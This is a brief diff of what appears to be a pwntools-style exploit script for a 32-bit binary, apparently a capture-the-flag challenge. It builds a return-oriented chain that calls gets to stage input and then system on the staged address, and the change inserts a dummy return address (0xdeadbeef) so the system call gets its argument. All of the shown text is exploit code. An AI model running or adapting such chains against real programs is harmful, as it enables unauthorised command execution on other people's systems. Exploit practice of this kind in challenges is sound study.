@@ -15,6 +15,7 @@ payload1    += l32(plt_gets)
 payload1    += l32(p_ret)
 payload1    += l32(adr_stage)
 payload1    += l32(adr_system)
+payload1    += l32(0xdeadbeef)
 payload1    += l32(adr_stage)
 
 io.read_until("input path please:")
